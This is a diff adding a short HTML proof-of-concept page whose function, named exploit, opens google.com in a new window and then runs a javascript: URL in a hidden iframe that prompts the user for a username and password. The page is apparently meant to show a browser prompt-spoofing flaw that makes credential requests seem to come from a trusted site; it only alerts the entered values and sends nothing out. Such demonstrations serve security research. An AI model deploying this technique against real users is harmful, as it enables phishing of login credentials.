@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      function exploit() {
+        window.open("https://www.google.com");
+        
+        setTimeout(function () {
+          document.getElementById("iframe").src =
+            "javascript:let username = prompt('Enter your username');" +
+            "let password = prompt('Enter your password here');" +
+            "alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);";
+        }, 2000); 
+      }
+    </script>
+
+      <button onclick="exploit()">Click Here</button>
+    </a>
+
+    <iframe id="iframe" style="display:none;" src=""></iframe>
+  </body>
+</html>
